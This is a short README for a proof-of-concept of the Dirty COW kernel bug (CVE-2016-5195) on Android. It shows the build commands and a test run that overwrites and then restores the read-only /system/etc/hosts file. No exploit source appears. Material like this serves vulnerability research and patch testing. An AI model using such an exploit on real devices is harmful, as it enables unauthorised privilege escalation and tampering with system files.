# CVE-2016-5195
CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android

```
$ make build
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk
make[1]: Entering directory `./CVE-2016-5195'
[armeabi] Install        : dirtycow => libs/armeabi/dirtycow
[armeabi] Install        : run-as => libs/armeabi/run-as
make[1]: Leaving directory `./CVE-2016-5195'


$ ./test_dirtycow.sh
[100%] /data/local/tmp/dirtycow
[100%] /data/local/tmp/run-as
[100%] /system/etc/hosts
[100%] /data/local/tmp/hosts
[100%] /data/local/tmp/hosts.orig

----- before PoC -----
127.0.0.1		    localhost
warning: new file size (30) and file old size (25) differ

size 30


[*] mmap 0x40172000
[*] exploit (patch)
[*] currently 0x40172000=2e373231
[*] madvise = 0x40172000 30
[*] madvise = 0 1048576
[*] /proc/self/mem 31457280 1048576
[*] exploited 0x40172000=6f502023

----- after PoC -----
# PoC succeeded by dirtyc
size 25


[*] mmap 0x4017a000
[*] exploit (patch)
[*] currently 0x4017a000=6f502023
[*] madvise = 0x4017a000 25
[*] madvise = 0 1048576
[*] /proc/self/mem 26214400 1048576
[*] exploited 0x4017a000=2e373231

----- Target file Reverted  -----
127.0.0.1		    localhost
```
